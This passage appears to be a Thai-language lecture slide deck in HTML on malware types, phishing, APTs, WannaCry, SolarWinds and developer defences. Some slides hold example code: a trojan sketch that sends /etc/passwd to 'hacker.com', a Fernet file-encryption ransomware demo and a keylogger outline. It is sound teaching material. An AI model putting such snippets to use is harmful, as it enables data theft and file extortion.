@@ -1,0 +1,858 @@
+<!DOCTYPE html>
+<html lang="th">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Week 2: Cyber Threat Types & Malware | ENGSE214</title>
+    <link href="https://fonts.googleapis.com/css2?family=Sarabun:wght@300;400;600;800&family=JetBrains+Mono:wght@400;700&display=swap" rel="stylesheet">
+    <style>
+        :root {
+            /* Light Theme */
+            --bg-color: #f0f2f5;
+            --text-color: #2d3436;
+            --accent-color: #0984e3;
+            --secondary-color: #636e72;
+            --code-bg: #dfe6e9;
+            --slide-bg: #ffffff;
+            --shadow: 0 10px 30px rgba(0,0,0,0.1);
+            --success: #00b894;
+            --danger: #d63031;
+            --font-main: 'Sarabun', sans-serif;
+            --font-code: 'JetBrains Mono', monospace;
+        }
+
+        [data-theme="dark"] {
+            /* Dark Theme (Cyberpunk/Terminal) */
+            --bg-color: #0f0f12;
+            --text-color: #e0e0e0;
+            --accent-color: #00ff88;
+            --secondary-color: #a4b0be;
+            --code-bg: #1e1e1e;
+            --slide-bg: #1a1a1d;
+            --shadow: 0 10px 30px rgba(0,255,136,0.1);
+            --success: #00ff88;
+            --danger: #ff4757;
+        }
+
+        * { box-sizing: border-box; margin: 0; padding: 0; transition: background 0.3s, color 0.3s; }
+        
+        body {
+            font-family: var(--font-main);
+            background-color: var(--bg-color);
+            color: var(--text-color);
+            overflow: hidden;
+            height: 100vh;
+            width: 100vw;
+        }
+
+        /* Controls UI */
+        .ui-controls {
+            position: fixed;
+            top: 20px;
+            right: 20px;
+            z-index: 1000;
+            display: flex;
+            gap: 10px;
+            background: rgba(0,0,0,0.2);
+            padding: 10px;
+            border-radius: 50px;
+            backdrop-filter: blur(5px);
+        }
+
+        .btn-ui {
+            background: var(--slide-bg);
+            border: 1px solid var(--secondary-color);
+            color: var(--text-color);
+            padding: 8px 12px;
+            border-radius: 20px;
+            cursor: pointer;
+            font-size: 0.9rem;
+            font-weight: 600;
+        }
+        .btn-ui:hover { background: var(--accent-color); color: #fff; border-color: var(--accent-color); }
+
+        /* Slide Container */
+        #presentation {
+            width: 100%;
+            height: 100%;
+            position: relative;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+
+        .slide {
+            position: absolute;
+            width: 90%;
+            height: 85%;
+            max-width: 1200px;
+            background: var(--slide-bg);
+            border-radius: 20px;
+            box-shadow: var(--shadow);
+            padding: 40px 60px;
+            opacity: 0;
+            transform: translateY(20px) scale(0.95);
+            transition: all 0.5s cubic-bezier(0.4, 0, 0.2, 1);
+            display: flex;
+            flex-direction: column;
+            pointer-events: none;
+            overflow-y: auto;
+        }
+
+        .slide.active {
+            opacity: 1;
+            transform: translateY(0) scale(1);
+            pointer-events: all;
+            z-index: 10;
+        }
+
+        /* Typography */
+        h1 { font-size: 3rem; color: var(--accent-color); margin-bottom: 20px; font-weight: 800; line-height: 1.2; }
+        h2 { font-size: 2.2rem; color: var(--text-color); margin-bottom: 30px; border-bottom: 3px solid var(--accent-color); display: inline-block; padding-bottom: 5px; }
+        h3 { font-size: 1.6rem; color: var(--accent-color); margin-top: 20px; margin-bottom: 10px; }
+        p, li { font-size: 1.3rem; line-height: 1.6; color: var(--text-color); margin-bottom: 15px; }
+        ul { margin-left: 40px; }
+        strong { color: var(--accent-color); }
+
+        /* Layouts */
+        .two-col { display: grid; grid-template-columns: 1fr 1fr; gap: 40px; align-items: center; height: 100%; }
+        .center-content { text-align: center; justify-content: center; align-items: center; }
+        .hero-slide { text-align: center; justify-content: center; background: linear-gradient(135deg, rgba(0,0,0,0.05) 0%, rgba(0,0,0,0) 100%); }
+
+        /* Components */
+        .code-block {
+            background: #282c34;
+            color: #abb2bf;
+            padding: 20px;
+            border-radius: 10px;
+            font-family: var(--font-code);
+            font-size: 1rem;
+            overflow-x: auto;
+            border-left: 5px solid var(--accent-color);
+            margin: 20px 0;
+            box-shadow: inset 0 0 20px rgba(0,0,0,0.5);
+        }
+        .code-keyword { color: #c678dd; }
+        .code-string { color: #98c379; }
+        .code-func { color: #61afef; }
+        .code-comment { color: #5c6370; font-style: italic; }
+
+        .tag { display: inline-block; padding: 5px 15px; border-radius: 50px; font-size: 0.9rem; font-weight: bold; margin-right: 10px; background: rgba(0,0,0,0.05); border: 1px solid var(--accent-color); color: var(--accent-color); }
+        
+        .alert-box {
+            background: rgba(214, 48, 49, 0.1);
+            border-left: 5px solid var(--danger);
+            padding: 20px;
+            border-radius: 5px;
+            margin: 20px 0;
+        }
+
+        /* Diagrams with CSS Grid */
+        .diagram-grid {
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 15px;
+            text-align: center;
+        }
+        .diagram-box {
+            background: var(--bg-color);
+            padding: 20px;
+            border-radius: 10px;
+            border: 2px solid var(--secondary-color);
+        }
+        .arrow-down { font-size: 2rem; color: var(--accent-color); text-align: center; margin: 10px 0; }
+
+        /* Navigation Buttons */
+        .nav-btn {
+            position: absolute;
+            top: 50%;
+            transform: translateY(-50%);
+            background: var(--accent-color);
+            color: #fff;
+            border: none;
+            width: 50px;
+            height: 50px;
+            border-radius: 50%;
+            font-size: 1.5rem;
+            cursor: pointer;
+            z-index: 100;
+            opacity: 0.5;
+            transition: 0.3s;
+        }
+        .nav-btn:hover { opacity: 1; transform: translateY(-50%) scale(1.1); }
+        #prev { left: 20px; }
+        #next { right: 20px; }
+
+        /* Progress Bar */
+        .progress-container {
+            position: fixed;
+            bottom: 0;
+            left: 0;
+            width: 100%;
+            height: 8px;
+            background: rgba(0,0,0,0.1);
+        }
+        .progress-bar {
+            height: 100%;
+            background: var(--accent-color);
+            width: 0%;
+            transition: width 0.3s;
+        }
+
+        /* Quiz Reveal */
+        .reveal-answer {
+            background: var(--bg-color);
+            padding: 15px;
+            margin-top: 10px;
+            border-radius: 8px;
+            cursor: pointer;
+            border: 1px dashed var(--secondary-color);
+        }
+        .reveal-answer span { visibility: hidden; }
+        .reveal-answer.revealed span { visibility: visible; }
+        .reveal-answer.revealed { border-style: solid; border-color: var(--success); }
+
+        /* Responsive */
+        @media (max-width: 768px) {
+            h1 { font-size: 2rem; }
+            .two-col { grid-template-columns: 1fr; }
+            .slide { padding: 20px; }
+            .ui-controls { top: auto; bottom: 20px; right: 20px; }
+        }
+    </style>
+</head>
+<body data-theme="dark">
+
+    <div class="ui-controls">
+        <button class="btn-ui" onclick="toggleTheme()">🌓 Theme</button>
+        <button class="btn-ui" onclick="adjustFont(1)">A+</button>
+        <button class="btn-ui" onclick="adjustFont(-1)">A-</button>
+        <button class="btn-ui" onclick="toggleFullScreen()">⛶ Full</button>
+    </div>
+
+    <button id="prev" class="nav-btn" onclick="moveSlide(-1)">❮</button>
+    <button id="next" class="nav-btn" onclick="moveSlide(1)">❯</button>
+
+    <div id="presentation">
+
+        <div class="slide hero-slide active">
+            <div style="font-size: 5rem; margin-bottom: 20px;">🦠🛡️</div>
+            <p class="tag">ENGSE214 – Introduction to Cyber Security</p>
+            <h1>Week 2: Cyber Threat Types & Malware</h1>
+            <p>จำแนกภัยคุกคาม • เข้าใจมัลแวร์ • รู้ทันกลลวง</p>
+            <div style="margin-top: 30px; border-top: 1px solid var(--secondary-color); padding-top: 20px;">
+                <p style="font-size: 1rem;">สอนโดย: อาจารย์สาขาวิศวกรรมซอฟต์แวร์</p>
+            </div>
+        </div>
+
+        <div class="slide">
+            <h2>📋 Agenda (เนื้อหาในวันนี้)</h2>
+            <div class="two-col">
+                <ul>
+                    <li><strong>Threat Classification:</strong> การแบ่งประเภทภัยคุกคาม</li>
+                    <li><strong>Malware Zoo:</strong> Virus, Worm, Trojan, Ransomware</li>
+                    <li><strong>Social Engineering:</strong> เจาะระบบที่ "คน"</li>
+                    <li><strong>APT:</strong> ภัยคุกคามระดับสูง</li>
+                </ul>
+                <ul>
+                    <li><strong>Live Demo:</strong> การทำงานของ Ransomware</li>
+                    <li><strong>Workshop:</strong> วิเคราะห์ Phishing Email</li>
+                    <li><strong>Case Studies:</strong> WannaCry & SolarWinds</li>
+                    <li><strong>Defense:</strong> แนวทางการป้องกันสำหรับ Dev</li>
+                </ul>
+            </div>
+        </div>
+
+        <div class="slide center-content">
+            <h2>ทำไมเรื่องนี้ถึงสำคัญกับ Software Engineer?</h2>
+            <p style="font-size: 1.5rem;">"The weakest link in security is not the computer,<br>but the <strong>human</strong> behind it."</p>
+            <div class="two-col" style="margin-top: 40px;">
+                <div class="alert-box" style="border-left-color: var(--accent-color);">
+                    <h3>💻 ในฐานะ Developer</h3>
+                    <p>เราต้องเขียนโค้ดที่ไม่เปิดช่องให้ Malware เข้ามาได้ และต้องรู้วิธี Hardening ระบบ</p>
+                </div>
+                <div class="alert-box">
+                    <h3>👥 ในฐานะ User</h3>
+                    <p>เพื่อไม่ให้ตกเป็นเหยื่อของการหลอกลวง (Social Engineering) จนทำบริษัทเสียหาย</p>
+                </div>
+            </div>
+        </div>
+
+        <div class="slide">
+            <h2>🎭 Cyber Threat Landscape</h2>
+            <div class="diagram-grid">
+                <div class="diagram-box">
+                    <h3>🦠 Malware</h3>
+                    <p>Virus, Worm, Trojan, Ransomware</p>
+                </div>
+                <div class="diagram-box">
+                    <h3>🎣 Social Eng.</h3>
+                    <p>Phishing, Baiting, Pretexting</p>
+                </div>
+                <div class="diagram-box">
+                    <h3>🕵️ APT</h3>
+                    <p>State-sponsored, Long-term</p>
+                </div>
+                <div class="diagram-box">
+                    <h3>🌐 Network</h3>
+                    <p>DDoS, MITM, Sniffing</p>
+                </div>
+                <div class="diagram-box">
+                    <h3>💻 Web</h3>
+                    <p>SQLi, XSS, CSRF</p>
+                </div>
+                <div class="diagram-box">
+                    <h3>🏃 Physical</h3>
+                    <p>Theft, Sabotage</p>
+                </div>
+            </div>
+        </div>
+
+        <div class="slide">
+            <h2>ระดับความอันตราย (Threat Levels)</h2>
+            <table>
+                <tr style="border-bottom: 2px solid var(--accent-color);">
+                    <th style="text-align:left; padding:15px;">Level</th>
+                    <th style="text-align:left;">Attacker Type</th>
+                    <th style="text-align:left;">Skill / Resource</th>
+                </tr>
+                <tr>
+                    <td style="padding:15px;"><span class="tag">Low</span></td>
+                    <td>Script Kiddies</td>
+                    <td>ใช้เครื่องมือสำเร็จรูป, ความรู้จำกัด</td>
+                </tr>
+                <tr>
+                    <td style="padding:15px;"><span class="tag" style="color:orange; border-color:orange;">Medium</span></td>
+                    <td>Organized Crime</td>
+                    <td>ทำเพื่อเงิน, มีทีมงาน, Ransomware-as-a-Service</td>
+                </tr>
+                <tr>
+                    <td style="padding:15px;"><span class="tag" style="color:red; border-color:red;">High</span></td>
+                    <td>Nation-State (APT)</td>
+                    <td>งบประมาณไม่จำกัด, 0-day exploits, เป้าหมายการเมือง</td>
+                </tr>
+            </table>
+        </div>
+
+        <div class="slide">
+            <h2>CIA Triad Impact</h2>
+            <p>ภัยคุกคามส่งผลกระทบต่อ 3 แกนหลักอย่างไร?</p>
+            <div class="diagram-grid" style="grid-template-columns: 1fr 1fr 1fr; margin-top: 30px;">
+                <div class="diagram-box" style="border-color: #74b9ff;">
+                    <h3>Confidentiality</h3>
+                    <p><strong>"ความลับรั่วไหล"</strong></p>
+                    <hr>
+                    <p>Spyware, Phishing, Keylogger</p>
+                </div>
+                <div class="diagram-box" style="border-color: #ffeaa7;">
+                    <h3>Integrity</h3>
+                    <p><strong>"ข้อมูลถูกแก้ไข"</strong></p>
+                    <hr>
+                    <p>Virus, Trojan, Rootkit</p>
+                </div>
+                <div class="diagram-box" style="border-color: #ff7675;">
+                    <h3>Availability</h3>
+                    <p><strong>"ระบบใช้งานไม่ได้"</strong></p>
+                    <hr>
+                    <p>Ransomware, DDoS, Wiper</p>
+                </div>
+            </div>
+        </div>
+
+        <div class="slide">
+            <h2>🦠 Malware (Malicious Software)</h2>
+            <p>ซอฟต์แวร์ที่ออกแบบมาเพื่อทำความเสียหาย ขโมยข้อมูล หรือทำลายระบบ</p>
+            <div class="two-col">
+                <div>
+                    <h3>ตระกูลหลักๆ ของ Malware:</h3>
+                    <ul>
+                        <li><strong>Virus:</strong> ติดเชื้อไฟล์อื่น</li>
+                        <li><strong>Worm:</strong> กระจายตัวเองผ่าน Network</li>
+                        <li><strong>Trojan:</strong> ม้าไม้เมืองทรอย (แอบแฝง)</li>
+                        <li><strong>Ransomware:</strong> เรียกค่าไถ่</li>
+                        <li><strong>Spyware:</strong> สายลับจับข้อมูล</li>
+                    </ul>
+                </div>
+                <div class="center-content">
+                    <img src="https://img.icons8.com/nolan/200/virus.png" alt="Malware Icon" style="width: 200px;">
+                </div>
+            </div>
+        </div>
+
+        <div class="slide">
+            <h2>1. Computer Virus</h2>
+            <div class="alert-box">
+                <strong>Key Concept:</strong> "ต้องมี Host File + ต้องมี User Action"
+            </div>
+            <ul>
+                <li>แนบตัวเองไปกับไฟล์ .exe, .doc, .xlsm</li>
+                <li>ทำงานเมื่อผู้ใช้ <strong>Double Click</strong> หรือเปิดไฟล์</li>
+                <li>พยายามแพร่กระจายไปติดไฟล์อื่นๆ ในเครื่องเดียวกัน</li>
+            </ul>
+            <div class="code-block">
+                <span class="code-comment"># Pseudo-code: Virus Logic</span><br>
+                <span class="code-keyword">def</span> <span class="code-func">infect</span>(file):<br>
+                &nbsp;&nbsp;<span class="code-keyword">if</span> <span class="code-keyword">not</span> is_infected(file):<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;append_virus_code(file)<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;print(<span class="code-string">"Infected: "</span> + file)
+            </div>
+        </div>
+
+        <div class="slide">
+            <h2>2. Computer Worm (หนอน)</h2>
+            <div class="alert-box" style="border-left-color: var(--accent-color);">
+                <strong>Key Concept:</strong> "Standalone + Automatic Propagation"
+            </div>
+            <ul>
+                <li>ไม่ต้องเกาะไฟล์อื่น (เป็นโปรแกรมแยก)</li>
+                <li><strong>ไม่ต้องรอ User กด</strong> (แพร่ผ่านช่องโหว่ Network)</li>
+                <li>เติบโตแบบ Exponential (ทวีคูณ)</li>
+            </ul>
+            <p><strong>ตัวอย่างดัง:</strong> WannaCry (ใช้ EternalBlue Exploit เจาะ SMB port)</p>
+        </div>
+
+        <div class="slide">
+            <h2>💻 Code: Worm Propagation Concept</h2>
+            <div class="code-block">
+<span class="code-keyword">class</span> <span class="code-func">WormSimulator</span>:<br>
+&nbsp;&nbsp;<span class="code-keyword">def</span> <span class="code-func">propagate</span>(self):<br>
+&nbsp;&nbsp;&nbsp;&nbsp;<span class="code-comment"># 1. Scan Network หาเครื่องที่มีช่องโหว่</span><br>
+&nbsp;&nbsp;&nbsp;&nbsp;targets = self.scan_network(<span class="code-string">"192.168.1.0/24"</span>)<br><br>
+&nbsp;&nbsp;&nbsp;&nbsp;<span class="code-comment"># 2. โจมตีและ Copy ตัวเองไปอัตโนมัติ</span><br>
+&nbsp;&nbsp;&nbsp;&nbsp;<span class="code-keyword">for</span> target <span class="code-keyword">in</span> targets:<br>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="code-keyword">if</span> self.exploit(target):<br>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;self.copy_self_to(target)<br>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;self.execute_remote(target)<br>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print(f<span class="code-string">"[+] Infected {target}"</span>)
+            </div>
+        </div>
+
+        <div class="slide">
+            <h2>⚔️ Virus vs Worm</h2>
+            <table style="width:100%; font-size: 1.2rem; border-collapse: collapse;">
+                <tr style="background: rgba(255,255,255,0.1);">
+                    <th style="padding:15px;">Feature</th>
+                    <th style="color: #ff7675;">Virus</th>
+                    <th style="color: #74b9ff;">Worm</th>
+                </tr>
+                <tr>
+                    <td style="padding:15px; border-bottom: 1px solid var(--secondary-color);">Host File?</td>
+                    <td style="border-bottom: 1px solid var(--secondary-color);">✅ จำเป็น (ต้องเกาะ)</td>
+                    <td style="border-bottom: 1px solid var(--secondary-color);">❌ ไม่จำเป็น (Standalone)</td>
+                </tr>
+                <tr>
+                    <td style="padding:15px; border-bottom: 1px solid var(--secondary-color);">User Action?</td>
+                    <td style="border-bottom: 1px solid var(--secondary-color);">✅ ต้อง Click/Run</td>
+                    <td style="border-bottom: 1px solid var(--secondary-color);">❌ Auto (ผ่าน Network)</td>
+                </tr>
+                <tr>
+                    <td style="padding:15px;">การแพร่กระจาย</td>
+                    <td>ช้ากว่า (รอคนส่งไฟล์)</td>
+                    <td>เร็วมาก (ระดับวินาที)</td>
+                </tr>
+            </table>
+        </div>
+
+        <div class="slide">
+            <h2>3. Trojan Horse (ม้าโทรจัน)</h2>
+            <div class="two-col">
+                <div>
+                    <p><strong>"ดูดีภายนอก แต่ร้ายภายใน"</strong></p>
+                    <ul>
+                        <li>ปลอมตัวเป็นโปรแกรมปกติ (Game, Crack, Utility)</li>
+                        <li>เมื่อติดตั้ง จะเปิด <strong>Backdoor</strong> ให้ Hacker เข้ามา</li>
+                        <li>ไม่แพร่กระจายตัวเอง (ต้องหลอกให้คนโหลด)</li>
+                    </ul>
+                    <div class="alert-box">
+                        <strong>RAT (Remote Access Trojan):</strong><br>
+                        Hacker สามารถดูหน้าจอ, เปิดกล้อง, พิมพ์คีย์บอร์ด แทนเราได้หมด
+                    </div>
+                </div>
+                <div class="code-block" style="font-size: 0.8rem;">
+<span class="code-comment"># Trojan Logic</span><br>
+print(<span class="code-string">"Installing Free Game..."</span>)<br>
+<span class="code-comment"># Background activity:</span><br>
+connect_to_C2_server(<span class="code-string">"hacker.com"</span>)<br>
+send_file(<span class="code-string">"/etc/passwd"</span>)<br>
+enable_keylogger()<br>
+print(<span class="code-string">"Install Complete! Enjoy!"</span>)
+                </div>
+            </div>
+        </div>
+
+        <div class="slide">
+            <h2 style="color: var(--danger);">4. Ransomware (แรนซัมแวร์)</h2>
+            <div class="hero-slide" style="background: rgba(200,0,0,0.1); border-radius: 20px; padding: 20px;">
+                <h1>YOUR FILES ARE ENCRYPTED!</h1>
+                <p>Pay 0.5 Bitcoin to recover your files.</p>
+                <p style="color:red; font-family: monospace;">Time Remaining: 23:59:59</p>
+            </div>
+            <div style="margin-top: 20px;">
+                <ul>
+                    <li><strong>Mechanism:</strong> เข้ารหัสไฟล์ (Encryption) ทำให้เปิดไม่ได้</li>
+                    <li><strong>Payment:</strong> เรียกค่าไถ่เป็น Cryptocurrency (ตามตัวยาก)</li>
+                    <li><strong>Double Extortion:</strong> ถ้าไม่จ่าย จะปล่อยข้อมูลความลับสู่สาธารณะ</li>
+                </ul>
+            </div>
+        </div>
+
+        <div class="slide">
+            <h2>💻 Ransomware Simulation Code</h2>
+            <p>แนวคิดการทำงาน (ห้ามนำไปใช้จริง!)</p>
+            <div class="code-block">
+<span class="code-keyword">from</span> cryptography.fernet <span class="code-keyword">import</span> Fernet<br><br>
+<span class="code-comment"># 1. Generate Key (Hacker keeps this)</span><br>
+key = Fernet.generate_key()<br>
+cipher = Fernet(key)<br><br>
+<span class="code-comment"># 2. Encrypt File</span><br>
+<span class="code-keyword">with</span> open(<span class="code-string">'thesis_final.docx'</span>, <span class="code-string">'rb'</span>) <span class="code-keyword">as</span> f:<br>
+&nbsp;&nbsp;original_data = f.read()<br><br>
+encrypted_data = cipher.encrypt(original_data)<br><br>
+<span class="code-keyword">with</span> open(<span class="code-string">'thesis_final.docx.locked'</span>, <span class="code-string">'wb'</span>) <span class="code-keyword">as</span> f:<br>
+&nbsp;&nbsp;f.write(encrypted_data)<br><br>
+print(<span class="code-string">"File Encrypted. Send Bitcoin to get the Key."</span>)
+            </div>
+        </div>
+
+        <div class="slide">
+            <h2>5. Spyware & Keyloggers</h2>
+            <p>สายลับที่ทำงานเงียบเชียบที่สุด</p>
+            <div class="diagram-grid">
+                <div class="diagram-box">
+                    <h3>Keylogger</h3>
+                    <p>บันทึกทุกปุ่มที่กด (Password, Credit Card)</p>
+                </div>
+                <div class="diagram-box">
+                    <h3>Screen Recorder</h3>
+                    <p>แคปหน้าจอขณะเราทำงานสำคัญ</p>
+                </div>
+                <div class="diagram-box">
+                    <h3>Banking Trojan</h3>
+                    <p>สร้างหน้า Login ปลอมทับหน้าแอพธนาคาร</p>
+                </div>
+            </div>
+            <br>
+            <div class="code-block" style="font-size: 0.9rem;">
+<span class="code-comment"># Keylogger Concept</span><br>
+<span class="code-keyword">def</span> <span class="code-func">on_press</span>(key):<br>
+&nbsp;&nbsp;log_to_file(key)<br>
+&nbsp;&nbsp;<span class="code-keyword">if</span> detect_pattern(<span class="code-string">"password"</span>):<br>
+&nbsp;&nbsp;&nbsp;&nbsp;send_alert_to_hacker()
+            </div>
+        </div>
+
+        <div class="slide">
+            <h2>🎣 Social Engineering</h2>
+            <p>"Hack คน ง่ายกว่า Hack คอม"</p>
+            <div class="two-col">
+                <div>
+                    <p>การหลอกลวงทางจิตวิทยาเพื่อให้เหยื่อ:</p>
+                    <ol>
+                        <li>เปิดเผยข้อมูลลับ (Password, OTP)</li>
+                        <li>ทำธุรกรรมการเงิน (โอนเงิน)</li>
+                        <li>ติดตั้ง Malware ให้</li>
+                    </ol>
+                </div>
+                <div class="center-content">
+                    <div style="font-size: 8rem;">🧠🔓</div>
+                </div>
+            </div>
+        </div>
+
+        <div class="slide">
+            <h2>1. Phishing (ตกปลา)</h2>
+            <p>ส่ง Email/Message ปลอมตัวเป็นองค์กรที่น่าเชื่อถือ</p>
+            <div class="diagram-box" style="text-align: left; font-family: sans-serif; border: 1px solid #ccc; padding: 20px;">
+                <p><strong>From:</strong> security@paypa1.com <span style="color:red;">(Fake Domain)</span></p>
+                <p><strong>Subject:</strong> ⚠️ URGENT: Your account will be suspended!</p>
+                <hr>
+                <p>Dear Customer,</p>
+                <p>We detected unusual activity. Click link below within 24 hours.</p>
+                <button style="background: blue; color: white; border: none; padding: 10px;">Verify Now</button> <span style="color:red;">(Link to Malware)</span>
+            </div>
+            <p style="margin-top: 10px;"><strong>Tactics:</strong> Fear, Urgency, Authority</p>
+        </div>
+
+        <div class="slide">
+            <h2>2. Spear Phishing & Whaling</h2>
+            <div class="two-col">
+                <div>
+                    <h3>Spear Phishing 🔱</h3>
+                    <p><strong>"ล็อคเป้า"</strong> โจมตีเฉพาะบุคคล</p>
+                    <ul>
+                        <li>รู้ชื่อจริง, ตำแหน่ง, เพื่อนร่วมงาน</li>
+                        <li>เนื้อหาสมจริงมาก (เช่น อ้างถึงโปรเจกต์ที่ทำอยู่)</li>
+                    </ul>
+                </div>
+                <div>
+                    <h3>Whaling 🐋</h3>
+                    <p><strong>"ล่าวาฬ"</strong> (ผู้บริหารระดับสูง)</p>
+                    <ul>
+                        <li>เป้าหมาย: CEO, CFO</li>
+                        <li>วัตถุประสงค์: สั่งโอนเงินจำนวนมหาศาล, ขโมยความลับบริษัท</li>
+                    </ul>
+                </div>
+            </div>
+        </div>
+
+        <div class="slide">
+            <h2>Techniques อื่นๆ</h2>
+            <ul>
+                <li><strong>Pretexting:</strong> สร้างสถานการณ์/บทบาทสมมติ (เช่น แกล้งเป็น IT Support โทรขอ Password)</li>
+                <li><strong>Baiting:</strong> การล่อลวง (เช่น ทิ้ง Flash Drive เขียนว่า "Bonus 2024" ไว้ที่ลานจอดรถ)</li>
+                <li><strong>Quid Pro Quo:</strong> ยื่นหมูยื่นแมว (เช่น "ช่วยทำแบบสอบถามแลก Gift Voucher" แต่ขอข้อมูลส่วนตัว)</li>
+            </ul>
+        </div>
+
+        <div class="slide">
+            <h2>🇹🇭 Case Study: Call Center Gangs</h2>
+            <p>Social Engineering ที่ใกล้ตัวคนไทยที่สุด</p>
+            <div class="diagram-grid">
+                <div class="diagram-box">
+                    <h3>The Hook</h3>
+                    <p>"มีพัสดุตกค้าง" / "บัญชีถูกอายัด"</p>
+                </div>
+                <div class="arrow-down">➡️</div>
+                <div class="diagram-box">
+                    <h3>The Fear</h3>
+                    <p>"คุณพัวพันการฟอกเงิน ต้องตรวจสอบ"</p>
+                </div>
+                <div class="arrow-down">➡️</div>
+                <div class="diagram-box">
+                    <h3>The Action</h3>
+                    <p>"โอนเงินมาบัญชีกลางเพื่อตรวจสอบ"</p>
+                </div>
+            </div>
+        </div>
+
+        <div class="slide">
+            <h2>🕵️ Advanced Persistent Threats (APT)</h2>
+            <p>ภัยคุกคามระดับ "บอสใหญ่"</p>
+            <ul>
+                <li><strong>Advanced:</strong> ใช้เทคนิคชั้นสูง, 0-day exploits</li>
+                <li><strong>Persistent:</strong> ฝังตัวในระบบนานเป็นเดือน/ปี ไม่รีบร้อน</li>
+                <li><strong>Threat:</strong> มีเป้าหมายชัดเจน (จารกรรมข้อมูลรัฐ, ขโมยสูตรลับ)</li>
+                <li><strong>Examples:</strong> APT29 (Russia), Lazarus (North Korea)</li>
+            </ul>
+        </div>
+
+        <div class="slide">
+            <h2>The Cyber Kill Chain</h2>
+            <p>ขั้นตอนการโจมตีอย่างเป็นระบบของ APT</p>
+            <ol style="font-size: 1.2rem;">
+                <li><strong>Reconnaissance:</strong> ส่องเป้าหมาย หาข้อมูล</li>
+                <li><strong>Weaponization:</strong> สร้าง Malware เตรียมโจมตี</li>
+                <li><strong>Delivery:</strong> ส่งอาวุธ (Email, USB)</li>
+                <li><strong>Exploitation:</strong> เจาะช่องโหว่</li>
+                <li><strong>Installation:</strong> ฝัง Backdoor</li>
+                <li><strong>C2 (Command & Control):</strong> เชื่อมต่อกับ Server แม่ข่าย</li>
+                <li><strong>Actions on Objectives:</strong> ขโมยข้อมูล/ทำลาย</li>
+            </ol>
+        </div>
+
+        <div class="slide">
+            <h2>📂 Case Study: WannaCry (2017)</h2>
+            <div class="two-col">
+                <div>
+                    <ul>
+                        <li><strong>Type:</strong> Ransomware Worm</li>
+                        <li><strong>Impact:</strong> 200,000+ เครื่อง ใน 150 ประเทศ</li>
+                        <li><strong>Victims:</strong> โรงพยาบาล NHS (UK), FedEx, Nissan</li>
+                        <li><strong>Root Cause:</strong> ไม่ได้ Patch Windows (EternalBlue SMB exploit)</li>
+                    </ul>
+                </div>
+                <div class="alert-box">
+                    <strong>Lesson Learned:</strong><br>
+                    "Patch Management is Critical"<br>
+                    แค่ Update Windows ก็รอดแล้ว
+                </div>
+            </div>
+        </div>
+
+        <div class="slide">
+            <h2>🏭 Case Study: SolarWinds (2020)</h2>
+            <h3>Supply Chain Attack</h3>
+            <p>Hacker ไม่ได้เจาะเป้าหมายโดยตรง แต่เจาะที่ "บริษัทผู้ผลิต Software"</p>
+            <div class="diagram-grid" style="grid-template-columns: 1fr; margin-top:20px;">
+                <div class="diagram-box">
+                    1. Hacker ฝัง Code ใน Update ของ SolarWinds Orion
+                </div>
+                <div class="arrow-down">⬇️</div>
+                <div class="diagram-box">
+                    2. ลูกค้า 18,000 ราย ดาวน์โหลด Update ไปติดตั้ง
+                </div>
+                <div class="arrow-down">⬇️</div>
+                <div class="diagram-box">
+                    3. Hacker ได้ Backdoor เข้าสู่บริษัทใหญ่และรัฐบาลสหรัฐฯ ทันที
+                </div>
+            </div>
+        </div>
+
+        <div class="slide">
+            <h2>🔎 Workshop: Spot the Phish</h2>
+            <p>ลิงก์ไหนคือของจริง? (Click เพื่อดูเฉลย)</p>
+            
+            <div class="reveal-answer" onclick="this.classList.toggle('revealed')">
+                1. http://www.scb.co.th.verify.com
+                <br><br>
+                <span style="color:var(--danger)">❌ FAKE (Subdomain trick: Domain จริงคือ verify.com)</span>
+            </div>
+
+            <div class="reveal-answer" onclick="this.classList.toggle('revealed')">
+                2. https://www.paypal.com@192.168.1.5
+                <br><br>
+                <span style="color:var(--danger)">❌ FAKE (Redirects to IP address after @)</span>
+            </div>
+
+            <div class="reveal-answer" onclick="this.classList.toggle('revealed')">
+                3. https://accounts.google.com/ServiceLogin
+                <br><br>
+                <span style="color:var(--success)">✅ REAL (Domain is google.com)</span>
+            </div>
+        </div>
+
+        <div class="slide">
+            <h2>🛡️ Defense in Depth</h2>
+            <p>การป้องกันหลายชั้นเหมือนหัวหอม</p>
+            <div style="position: relative; width: 300px; height: 300px; margin: 0 auto;">
+                <div style="position: absolute; width: 100%; height: 100%; border-radius: 50%; background: #00b894; opacity: 0.2; transform: scale(1);"></div>
+                <div style="position: absolute; width: 100%; height: 100%; border-radius: 50%; border: 2px solid var(--accent-color); transform: scale(1);"></div>
+                <div style="position: absolute; top:15%; left:15%; width: 70%; height: 70%; border-radius: 50%; border: 2px solid var(--text-color); background: var(--slide-bg); display:flex; align-items:center; justify-content:center;">Data</div>
+                <div style="position: absolute; top:-20px; width:100%; text-align:center;">Policies</div>
+                <div style="position: absolute; bottom:-20px; width:100%; text-align:center;">Physical</div>
+                <div style="position: absolute; right:-40px; top:50%; transform:translateY(-50%);">Network</div>
+            </div>
+            <p style="text-align:center; margin-top:20px;">Physical > Network > Host > App > Data</p>
+        </div>
+
+        <div class="slide">
+            <h2>🛠️ Prevention Checklist for Developers</h2>
+            <div class="two-col">
+                <div>
+                    <h3>Coding Level</h3>
+                    <ul>
+                        <li>✅ Validate Input (กัน Injection)</li>
+                        <li>✅ Use Parameterized Queries</li>
+                        <li>✅ Update Dependencies (กัน Supply Chain)</li>
+                        <li>✅ Don't hardcode credentials</li>
+                    </ul>
+                </div>
+                <div>
+                    <h3>System Level</h3>
+                    <ul>
+                        <li>✅ Patch OS/Software สม่ำเสมอ</li>
+                        <li>✅ ใช้ MFA (Multi-Factor Auth)</li>
+                        <li>✅ ปิด Port ที่ไม่จำเป็น</li>
+                        <li>✅ Backup ข้อมูล (3-2-1 Rule)</li>
+                    </ul>
+                </div>
+            </div>
+        </div>
+
+        <div class="slide">
